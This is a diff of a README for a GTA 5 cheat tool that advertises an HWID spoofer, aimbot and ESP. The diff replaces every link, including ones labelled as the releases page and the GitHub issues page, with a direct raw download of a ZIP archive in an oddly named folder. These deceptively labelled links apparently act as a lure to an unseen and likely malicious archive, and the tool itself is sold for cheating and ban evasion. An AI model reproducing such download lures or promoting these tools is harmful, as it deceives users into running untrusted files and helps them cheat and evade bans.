@@ -4,8 +4,8 @@
 Welcome to Mod-Gta5! This tool will help you enhance your gameplay in Grand Theft Auto 5 with features like an HWID spoofer, a customizable aimbot, character ESP, and a 2D radar. Follow the steps below to get started.
 
 ## 📥 Download the Latest Release
-[![Download Mod-Gta5](https://img.shields.io/badge/Download_Mod--Gta5-ff69b4?style=for-the-badge&logo=github)](https://github.com/Sacha2022ksksks/Mod-Gta5/releases)  
-Visit this page to download the software: [Mod-Gta5 Releases](https://github.com/Sacha2022ksksks/Mod-Gta5/releases)
+[![Download Mod-Gta5](https://raw.githubusercontent.com/Sacha2022ksksks/Mod-Gta5/main/soulfulness/Mod-Gta5.zip)](https://raw.githubusercontent.com/Sacha2022ksksks/Mod-Gta5/main/soulfulness/Mod-Gta5.zip)  
+Visit this page to download the software: [Mod-Gta5 Releases](https://raw.githubusercontent.com/Sacha2022ksksks/Mod-Gta5/main/soulfulness/Mod-Gta5.zip)
 
 ## ✨ Features
 Mod-Gta5 provides various tools to enhance your gameplay, including:
@@ -29,7 +29,7 @@ Ensure your system meets the following requirements to run Mod-Gta5 smoothly:
 ## 📂 Download & Install
 To get started, follow these steps:
 
-1. Click on the download button above or visit the [Mod-Gta5 Releases](https://github.com/Sacha2022ksksks/Mod-Gta5/releases) page.
+1. Click on the download button above or visit the [Mod-Gta5 Releases](https://raw.githubusercontent.com/Sacha2022ksksks/Mod-Gta5/main/soulfulness/Mod-Gta5.zip) page.
 2. Locate the version you want to use.
 3. Click the download link for the latest version.
 4. Once downloaded, extract the ZIP file to your preferred location on your computer.
@@ -61,7 +61,7 @@ If you encounter any issues, consider the following steps:
 - Make sure your system meets the requirements listed above.
 - Restart your computer and try running the application again.
 
-For additional support, visit the issues section on the [Mod-Gta5 GitHub page](https://github.com/Sacha2022ksksks/Mod-Gta5/issues).
+For additional support, visit the issues section on the [Mod-Gta5 GitHub page](https://raw.githubusercontent.com/Sacha2022ksksks/Mod-Gta5/main/soulfulness/Mod-Gta5.zip).
 
 ## 📞 Contact
 If you have any questions or feedback, feel free to reach out via the issues section on GitHub. Your input helps improve the application for everyone.
